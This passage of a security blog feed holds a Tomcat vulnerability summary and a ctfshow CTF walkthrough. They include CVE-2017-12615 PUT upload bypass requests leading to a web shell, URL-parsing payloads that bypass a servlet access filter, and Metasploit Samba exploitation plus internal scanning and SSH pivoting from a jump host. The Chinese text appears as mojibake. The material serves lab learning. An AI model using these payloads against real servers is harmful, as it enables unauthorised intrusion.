<span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">>></span> forward <span class="token number">9000</span> <span class="token number">172.56</span>.102.2:5432<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725212738296.png" alt="image-20240725212738296"></p><p>ç„¶ånavicatè¿æ¥127.0.0.1:9000</p><p>å¦‚æœnavicatè¿æ¥æ—¶æŠ¥é”™ï¼š<code>column &quot;datlastsysoid&quot; does not exist  Line1:SELECT DISTINCT datalastsysoid FROM pg_database</code></p><p>è¯·å‚è€ƒè¿™ç¯‡æ–‡ç« ä¿®æ”¹å¯¹åº”çš„dllæ–‡ä»¶ï¼š<a href="https://cloud.tencent.com/developer/article/2314524">https://cloud.tencent.com/developer/article/2314524</a></p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725212821261.png" alt="image-20240725212821261"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è¿™æ˜¯ä»€ä¹ˆï¼ŸNISAå†…éƒ¨é¶åœºï¼Œæ‰“ä¸€ä¸‹&lt;/p&gt;</summary>
    
    
    
    <category term="æ¸—é€" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="å†…ç½‘" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="Redis" scheme="http://c1oudfl0w0.github.io/blog/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>Tomcatæ¼æ´æ€»ç»“</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2024-07-23T09:14:11.000Z</published>
    <updated>2024-07-26T09:35:16.270Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://xz.aliyun.com/t/10083">https://xz.aliyun.com/t/10083</a></p><p><a href="https://xz.aliyun.com/t/7544">https://xz.aliyun.com/t/7544</a></p><span id="more"></span><hr><h1 id="Tomcat-PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰"><a href="#Tomcat-PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰" class="headerlink" title="Tomcat PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰"></a>Tomcat PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰</h1><p>å¤ç°ç¯å¢ƒï¼š<a href="https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2017-12615/">https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2017-12615/</a></p><p>ç‰ˆæœ¬é™åˆ¶ï¼šä¸ç¡®å®šï¼Œè²Œä¼¼æ˜¯ä¸€ä¸ªé…ç½®æ¼æ´</p><p>æ¼æ´æˆå› ï¼š</p><p>&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;conf&#x2F;web.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>readonly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>readonlyè®¾ç½®ä¸ºfalseï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ PUT æ–¹æ³•è¿›è¡Œæ–‡ä»¶ä¸Šä¼ </p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726115438187.png" alt="image-20240726115438187"></p><p>è¿”å›201ï¼Œè¯´æ˜æˆåŠŸä¸Šä¼ </p><p>çœ‹ä¸€ä¸‹ &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT ç›®å½•</p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726115527994.png" alt="image-20240726115527994"></p><p>å¯ä»¥çœ‹åˆ°åˆšæ‰ä¸Šä¼ çš„test.txtæ–‡ä»¶</p><p>æ¥ä¸‹æ¥å°è¯•ä¸Šä¼ .jspï¼Œè¿”å›404ï¼Œåº”è¯¥æ˜¯å½“æˆè·¯å¾„è®¿é—®è¿›è¡Œè§£æäº†</p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726115822467.png" alt="image-20240726115822467"></p><p>è¿™é‡Œå°±éœ€è¦è¿›è¡Œç»•è¿‡ï¼Œæœ‰ä¸‰ç§æ–¹æ³•ï¼š</p><ol><li>Windowsä¸‹ä¸å…è®¸æ–‡ä»¶ä»¥ç©ºæ ¼ç»“å°¾ï¼šä»¥<code>PUT /a001.jsp%20 HTTP/1.1</code>ä¸Šä¼ åˆ° Windows ä¼šè¢«è‡ªåŠ¨å»æ‰æœ«å°¾ç©ºæ ¼</li><li>Windows NTFSæµï¼š<code>PUT /a001.jsp::$DATA HTTP/1.1</code>\</li><li><code>/</code>åœ¨æ–‡ä»¶åä¸­æ˜¯éæ³•çš„ï¼Œä¹Ÿä¼šè¢«å»é™¤ï¼ˆLinux&#x2F;Windowsï¼‰ï¼š<code>PUT /a001.jsp/ HTTP/1.1</code></li></ol><p>è¿™é‡Œåªæ¼”ç¤ºç¬¬ä¸‰ç§ï¼š</p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726120126859.png" alt="image-20240726120126859"></p><p>æˆåŠŸä¸Šä¼ ï¼Œç„¶åèšå‰‘getshellå³å¯</p><hr><h1 id="Tomcat-URLè§£æå·®å¼‚æ€§å¯¼è‡´çš„å®‰å…¨é—®é¢˜"><a href="#Tomcat-URLè§£æå·®å¼‚æ€§å¯¼è‡´çš„å®‰å…¨é—®é¢˜" class="headerlink" title="Tomcat URLè§£æå·®å¼‚æ€§å¯¼è‡´çš„å®‰å…¨é—®é¢˜"></a>Tomcat URLè§£æå·®å¼‚æ€§å¯¼è‡´çš„å®‰å…¨é—®é¢˜</h1><p>åå°ä½¿ç”¨<code>getRequestURI()</code>æˆ–<code>getRequestURL()</code>å‡½æ•°æ¥è§£æç”¨æˆ·è¯·æ±‚çš„URLæ—¶ï¼Œè‹¥URLä¸­åŒ…å«äº†ä¸€äº›ç‰¹æ®Šç¬¦å·ï¼Œåˆ™å¯èƒ½ä¼šé€ æˆè®¿é—®é™åˆ¶ç»•è¿‡çš„å®‰å…¨é£é™©</p><h2 id="HTTPServletRequestå¯¹URLçš„è§£æå·®å¼‚æ€§"><a href="#HTTPServletRequestå¯¹URLçš„è§£æå·®å¼‚æ€§" class="headerlink" title="HTTPServletRequestå¯¹URLçš„è§£æå·®å¼‚æ€§"></a>HTTPServletRequestå¯¹URLçš„è§£æå·®å¼‚æ€§</h2><p>åœ¨Servletå¤„ç†URLè¯·æ±‚çš„è·¯å¾„æ—¶ï¼ŒHTTPServletRequestæœ‰å¦‚ä¸‹å‡ ä¸ªå¸¸ç”¨çš„å‡½æ•°ï¼š</p><ul><li><code>request.getRequestURL()</code>ï¼šè¿”å›å…¨è·¯å¾„ï¼›</li><li><code>request.getRequestURI()</code>ï¼šè¿”å›é™¤å»Hostï¼ˆåŸŸåæˆ–IPï¼‰éƒ¨åˆ†çš„è·¯å¾„ï¼›</li><li><code>request.getContextPath()</code>ï¼šè¿”å›å·¥ç¨‹åéƒ¨åˆ†ï¼Œå¦‚æœå·¥ç¨‹æ˜ å°„ä¸º<code>/</code>ï¼Œåˆ™è¿”å›ä¸ºç©ºï¼›</li><li><code>request.getServletPath()</code>ï¼šè¿”å›é™¤å»Hostå’Œå·¥ç¨‹åéƒ¨åˆ†çš„è·¯å¾„ï¼›</li><li><code>request.getPathInfo()</code>ï¼šä»…è¿”å›ä¼ é€’åˆ°Servletçš„è·¯å¾„ï¼Œå¦‚æœæ²¡æœ‰ä¼ é€’é¢å¤–çš„è·¯å¾„ä¿¡æ¯ï¼Œåˆ™æ­¤è¿”å›Nullï¼›</li></ul><p>è®¾Servletçš„åŒ¹é…è·¯å¾„ä¸º<code>/test%3F/*</code>ï¼Œå¹¶ä¸”Webåº”ç”¨æ˜¯éƒ¨ç½²åœ¨<code>/app</code>ä¸‹</p><p>æ­¤æ—¶è¯·æ±‚çš„URLä¸º<code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID?p+1=c+d&amp;p+2=e+f#a</code>ï¼Œåˆ™å„ä¸ªå‡½æ•°è§£æå¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th>å‡½æ•°</th><th>URLè§£ç </th><th>è§£æç»“æ„</th></tr></thead><tbody><tr><td>getRequestURL()</td><td>no</td><td><code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td></tr><tr><td>getRequestURI()</td><td>no</td><td><code>/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td></tr><tr><td>getContextPath()</td><td>no</td><td><code>/app</code></td></tr><tr><td>getServletPath()</td><td>yes</td><td><code>/test?</code></td></tr><tr><td>getPathInfo()</td><td>yes</td><td><code>/a?+b</code></td></tr></tbody></table><hr><h2 id="ç‰¹æ®Šå­—ç¬¦çš„URLè§£æ"><a href="#ç‰¹æ®Šå­—ç¬¦çš„URLè§£æ" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦çš„URLè§£æ"></a>ç‰¹æ®Šå­—ç¬¦çš„URLè§£æ</h2><p>Tomcatä¸­çš„URLè§£ææ˜¯æ”¯æŒåµŒå…¥<code>./</code>ã€<code>../</code>ã€<code>;xx/</code>ç­‰ç‰¹æ®Šå­—ç¬¦çš„</p><p>æ–°å»ºä¸€ä¸ªJava Webé¡¹ç›®ï¼Œ1.jspå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%out.println(&quot;getRequestURL(): &quot; + request.getRequestURL() + &quot;&lt;br&gt;&quot;);out.println(&quot;getRequestURI(): &quot; + request.getRequestURI() + &quot;&lt;br&gt;&quot;);out.println(&quot;getContextPath(): &quot; + request.getContextPath() + &quot;&lt;br&gt;&quot;);out.println(&quot;getServletPath(): &quot; + request.getServletPath() + &quot;&lt;br&gt;&quot;);out.println(&quot;getPathInfo(): &quot; + request.getPathInfo() + &quot;&lt;br&gt;&quot;);%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ”¾åœ¨testç›®å½•ä¸‹</p><h3 id="æ­£å¸¸è®¿é—®"><a href="#æ­£å¸¸è®¿é—®" class="headerlink" title="æ­£å¸¸è®¿é—®"></a>æ­£å¸¸è®¿é—®</h3><p><code>http://localhost:8082/test/1.jsp</code></p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726172209143.png" alt="image-20240726172209143"></p><h3 id="æ’å…¥-x2F-è®¿é—®"><a href="#æ’å…¥-x2F-è®¿é—®" class="headerlink" title="æ’å…¥ .&#x2F; è®¿é—®"></a>æ’å…¥ .&#x2F; è®¿é—®</h3><p>æ’å…¥å¤šä¸ª<code>./</code>è®¿é—®ï¼Œå³<code>http://localhost:8082/test/./././1.jsp</code></p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726172226480.png" alt="image-20240726172226480"></p><p>æ¥ç€å°è¯•è¿™ç§å½¢å¼<code>http://localhost:8082/test/.a/.bb/.ccc/1.jsp</code></p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726172358304.png" alt="image-20240726172358304"></p><p>è¿”å›404ï¼Œæœªæ‰¾åˆ°èµ„æº</p><h3 id="æ’å…¥-x2F-è®¿é—®-1"><a href="#æ’å…¥-x2F-è®¿é—®-1" class="headerlink" title="æ’å…¥ ..&#x2F; è®¿é—®"></a>æ’å…¥ ..&#x2F; è®¿é—®</h3><p>æ’å…¥<code>../</code>è®¿é—®ï¼Œå³<code>http://localhost:8082/test/../1.jsp</code></p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726172534288.png" alt="image-20240726172534288"></p><p>404ï¼Œå› ä¸ºæ­¤æ—¶å®é™…è®¿é—®çš„æ˜¯<code>http://localhost:8082/test/1.jsp</code>ï¼Œä¹Ÿå°±è¯´æ˜è¿›è¡Œäº†ç›®å½•ç©¿è¶Š</p><h3 id="æ’å…¥-x2F-è®¿é—®-2"><a href="#æ’å…¥-x2F-è®¿é—®-2" class="headerlink" title="æ’å…¥ ;&#x2F; è®¿é—®"></a>æ’å…¥ ;&#x2F; è®¿é—®</h3><p>æ’å…¥å¤šä¸ª<code>;/</code>è®¿é—®ï¼Œå³<code>http://localhost:8082/test/;/;/;/1.jsp</code></p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726172725318.png" alt="image-20240726172725318"></p><p>æ­£å¸¸è¿”å›ï¼ŒåŒæ ·çš„åœ¨<code>;</code>åé¢åŠ å­—ç¬¦ä¸²ä¹Ÿèƒ½æ­£å¸¸è®¿é—®</p><hr><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>å’•</p><hr><h2 id="æ”»å‡»åˆ©ç”¨"><a href="#æ”»å‡»åˆ©ç”¨" class="headerlink" title="æ”»å‡»åˆ©ç”¨"></a>æ”»å‡»åˆ©ç”¨</h2><p>é‡åˆ°ä¸‹é¢è¿™ç§filterï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">filter</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> testFilter <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HttpServletRequest</span> httpServletRequest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span>servletRequest<span class="token punctuation">;</span>        <span class="token class-name">HttpServletResponse</span> httpServletResponse <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">)</span>servletResponse<span class="token punctuation">;</span>        <span class="token class-name">String</span> url <span class="token operator">=</span> httpServletRequest<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/test/info"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            httpServletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"No Permission."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶æˆ‘ä»¬å¦‚æœæƒ³è¦è®¿é—® &#x2F;test&#x2F;info ä¸‹çš„æ–‡ä»¶ï¼Œå¦‚<code>/test/info/secert.jsp</code>çš„è¯ä¼šè¢«æ‹¦æˆªè¿”å›No Permission</p><p>è€Œæ ¹æ®å‰é¢çš„urlè§£ææˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸‹é¢è¿™å‡ ç§ç»•è¿‡çš„æ–¹æ³•ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//localhost:8080/test/./info/secret.jsp</span></span><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//localhost:8080/test/;aaa/info/secret.jsp</span></span><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//localhost:8080/test/aaa/../info/secret.jsp</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/10083&quot;&gt;https://xz.aliyun.com/t/10083&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/7544&quot;&gt;https://xz.aliyun.com/t/7544&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="CVE" scheme="http://c1oudfl0w0.github.io/blog/tags/CVE/"/>
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow web859_æœ‰è·³æ¿æœº</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/</id>
    <published>2024-07-20T11:34:49.000Z</published>
    <updated>2024-07-20T12:53:37.037Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://fushuling.com/index.php/2023/08/20/ctfshow%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95%e6%8c%81%e7%bb%ad%e6%9b%b4%e6%96%b0%e4%b8%ad/">https://fushuling.com/index.php/2023/08/20/ctfshow%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95%e6%8c%81%e7%bb%ad%e6%9b%b4%e6%96%b0%e4%b8%ad/</a></p><p><a href="https://www.cnblogs.com/thebeastofwar/p/17750376.html">https://www.cnblogs.com/thebeastofwar/p/17750376.html</a></p><span id="more"></span><hr><h1 id="è¿æ¥è·³æ¿æœº"><a href="#è¿æ¥è·³æ¿æœº" class="headerlink" title="è¿æ¥è·³æ¿æœº"></a>è¿æ¥è·³æ¿æœº</h1><p>sshè¿æ¥ä¸Šå»ï¼Œè´¦å¯†å‡ä¸ºctfshow</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> ctfshow@pwn.challenge.ctf.show <span class="token parameter variable">-p28246</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç™»å½•ä¸Šå»ä¹‹åå°è¯•<code>cd ~</code>ï¼Œå‘ç°ç¼ºå°‘ &#x2F;home&#x2F;ctfshow ç›®å½•</p><p>å‘ç°èƒ½åˆ‡æˆrootæƒé™</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-s</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨&#x2F;homeç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªctfshowç›®å½•ç»™æƒé™</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /home/ctfshow<span class="token function">chmod</span> <span class="token number">777</span> /home/ctfshow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="fscanæ‰«ç«¯å£"><a href="#fscanæ‰«ç«¯å£" class="headerlink" title="fscanæ‰«ç«¯å£"></a>fscanæ‰«ç«¯å£</h1><p>æ¥ä¸‹æ¥ç”¨sshä¼ ä¸€ä¸ªfscanä¸Šå»æ‰«å†…ç½‘</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> <span class="token parameter variable">-P</span> <span class="token number">28246</span> fscan ctfshow@pwn.challenge.ctf.show:/home/ctfshow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720200128540.png" alt="image-20240720200128540"></p><p><code>ifconfig</code>æŸ¥çœ‹å†…ç½‘ç½‘æ®µ</p><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720203655783.png" alt="image-20240720203655783"></p><p>ç„¶åfscanæ‰«æ172.2.235.4</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> fscan./fscan <span class="token parameter variable">-h</span> <span class="token number">172.2</span>.235.4/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720203751766.png" alt="image-20240720203751766"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">start infoscan<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.4     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.1     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.5     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.6     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.7     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.2     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.3     is alive<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Icmp alive hosts len is: <span class="token number">7</span><span class="token number">172.2</span>.235.6:139 <span class="token function">open</span><span class="token number">172.2</span>.235.4:22 <span class="token function">open</span><span class="token number">172.2</span>.235.5:80 <span class="token function">open</span><span class="token number">172.2</span>.235.6:445 <span class="token function">open</span><span class="token number">172.2</span>.235.5:9000 <span class="token function">open</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¼€äº†139å’Œ445ç«¯å£</p><p>çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªç«¯å£å¸¸æœ‰ä»€ä¹ˆæ¼æ´ï¼š</p><ul><li>139ï¼šsambaæœåŠ¡</li><li>445ï¼šsmbç›¸å…³æœåŠ¡</li></ul><h1 id="msf-getshell"><a href="#msf-getshell" class="headerlink" title="msf getshell"></a>msf getshell</h1><p>å› ä¸ºè·³æ¿æœºé‡Œå·²ç»æœ‰è£…äº†ä¸€äº›æ”»å‡»å·¥å…·ï¼Œé‚£ä¹ˆå¯åŠ¨msfï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720202823525.png" alt="image-20240720202823525"></p><p>æµ‹è¯•äº†ä¸€ä¸‹è¦ç”¨<code>is_known_pipename</code>æ‰“</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/linux/samba/is_known_pipename<span class="token builtin class-name">set</span> rhost <span class="token number">172.2</span>.235.6exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720204001343.png" alt="image-20240720204001343"></p><p>flagåœ¨rootä¸‹</p><hr><h1 id="æµ‹è¯•ï¼šå†…ç½‘ä»£ç†"><a href="#æµ‹è¯•ï¼šå†…ç½‘ä»£ç†" class="headerlink" title="æµ‹è¯•ï¼šå†…ç½‘ä»£ç†"></a>æµ‹è¯•ï¼šå†…ç½‘ä»£ç†</h1><p>è¿™é‡Œçš„è·³æ¿æœºç›¸å½“äºæˆ‘ä»¬å·²ç»è·å¾—äº†ä¸€å°æœåŠ¡å™¨çš„æƒé™</p><h2 id="å•å±‚ä»£ç†"><a href="#å•å±‚ä»£ç†" class="headerlink" title="å•å±‚ä»£ç†"></a>å•å±‚ä»£ç†</h2><p>ç°åœ¨æˆ‘ä»¬å°è¯•å°†æœ¬åœ°çš„8085ç«¯å£è½¬å‘åˆ°å¯æ§æœåŠ¡å™¨å†…ç½‘ä¸­ 172.2.235.5 çš„80ç«¯å£ï¼ˆå³å†…ç½‘çš„webæœåŠ¡ï¼‰</p><p>ç„¶åå°±å¯ä»¥é€šè¿‡è®¿é—® 127.0.0.1:8085 æ¥è®¿é—® 172.2.235.5:80</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-L</span> <span class="token number">8085</span>:172.2.235.5:80 ctfshow@pwn.challenge.ctf.show <span class="token parameter variable">-p</span> <span class="token number">28229</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720204543400.png" alt="image-20240720204543400"></p><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720204602540.png" alt="image-20240720204602540"></p>]]></content>
    
    
